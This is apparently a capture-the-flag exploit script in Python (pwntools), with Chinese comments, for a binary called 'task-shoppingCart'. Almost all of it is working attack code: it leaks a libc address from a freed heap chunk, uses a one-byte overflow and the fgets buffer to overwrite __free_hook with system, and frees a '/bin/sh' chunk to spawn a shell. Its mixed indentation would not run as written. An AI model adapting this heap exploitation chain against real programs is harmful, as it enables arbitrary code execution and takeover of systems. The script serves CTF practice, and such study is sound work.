from pwn import *
import time
context.log_level = 'debug'

p = process("./task-shoppingCart")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def Break():
	p.recvuntil("EMMmmm, you will be a rich man!")
	p.sendline("3")

def Modify(index,payload):
	p.recvuntil("Now, buy buy buy!")
	p.sendline("3")
	p.recvuntil("Which goods you need to modify?")
	p.sendline(str(index))
	p.recvuntil("to?")
	p.send(payload)

def Free(index):
	p.recvuntil("Now, buy buy buy!")
	p.sendline("2")
	p.recvuntil("Which goods that you don't need?")
	p.sendline(str(index))
	p.recvuntil("You really don't need it?")


def Buy(length,name):
	p.recvuntil("Now, buy buy buy!")
	p.sendline("1")
	p.recvuntil("How long is your goods name?")
	p.sendline(str(length))
	p.recvuntil("What is your goods name?")
	p.sendline(name)

def Shop(payload):
	p.recvuntil("EMMmmm, you will be a rich man!")
	p.sendline("1")
	p.recvuntil("RMB or Dollar?")
	p.sendline(payload)

if __name__=="__main__":
	for i in range(0,0x14):
		payload = "AAAAAAA"
		Shop(payload)
#leak the address
	
	Break()
	Buy(0x100,"BBBBBB")
	Buy(0x70,"/bin/sh\0")

#	gdb.attach(p)

	Free(0) #释放获得unsorted bin

	Buy(0,"") #重新获得，用于泄露main_arena+344的地址
	
	p.recvuntil("Now, buy buy buy!")
    p.sendline("3")
    p.recvuntil("Which goods you need to modify?")
    p.sendline(str(2))
    p.recvuntil("modify ")
    leak_base = u64(p.recv(6).ljust(8,'\0')) - 344 - libc.symbols['__malloc_hook'] -0x10

	p.send("beef")
	print hex(leak_base)

	system_addr = leak_base + libc.symbols['system']
	 
	Modify(-1,"d"*8) #溢出一个字节（money和record在.bss相邻），覆盖到record的填充的指针的最后一个字节，使得该指针活到fgets的缓冲区
	#fgets的缓冲区位于堆的低地址处，通过fgets输入可以对堆上的内容进行覆盖

#	gdb.attach(p)	

	p.recvuntil("Now, buy buy buy!")
    p.sendline("3")
    p.recvuntil("Which goods you need to modify?")
	payload = str(-0x14) + '\n' + str(1)+'\n'+str(2)+'\n'
	payload = payload.ljust(0x1000-0x20,'c')#填充fgets缓冲区

	payload += p64(leak_base+libc.symbols['__free_hook'])
    p.send(payload)

    p.recvuntil("to?")

	p.send(p64(leak_base+libc.symbols['system'])) #将__free_hook覆盖成system
#	Modify(-0x14,"")
	#raw_input()	
#	time.sleep(2)
	Buy(0x200,"ddddd") #环境中有许多字符返回，再申请一次后可以正常运行
	
	Free(1)#“1”堆块上填充的为"/bin/sh\0"，所以Free(1)实际调用的是system("/bin/sh")

	p.interactive()




